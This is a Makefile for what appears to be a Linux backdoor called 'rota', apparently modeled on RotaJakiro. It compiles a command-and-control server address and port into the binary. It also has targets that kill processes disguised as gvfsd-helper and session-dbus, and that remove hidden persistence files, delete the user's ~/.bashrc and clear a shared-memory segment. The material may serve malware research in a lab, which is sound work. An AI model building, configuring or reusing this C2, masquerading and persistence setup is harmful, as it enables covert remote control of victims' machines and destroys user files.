CC=gcc
FLAGS=-ggdb -DDEBUG  -Wall -lpthread -pthread

#update Makefile here
C2_SERVER='"10.10.2.228"'
C2_PORT=1443

all: compile

bins:
	mkdir -p ./bin/

compile: bins
	$(CC) $(FLAGS) -DC2_SERVER=$(C2_SERVER) -DC2_PORT=$(C2_PORT) -I ./inc/ $(wildcard ./src/*.c) -ldl -o ./bin/rota

kill:
	pkill gvfsd-helper
	pkill session-dbus

clean:
	rm -rf ~/.config/au-tostart
	rm -rf ~/.gvfsd 	# Persistence file location
	rm -rf ~/.dbus		# Persistence file location
	rm -rf ~/.bashrc 	# Persistence file
	rm -rf ./bin 		# Local bins
	rm -rf ~/.X11 		# Lock files
	ipcrm -M 0x0064b2e2 # Shared memory
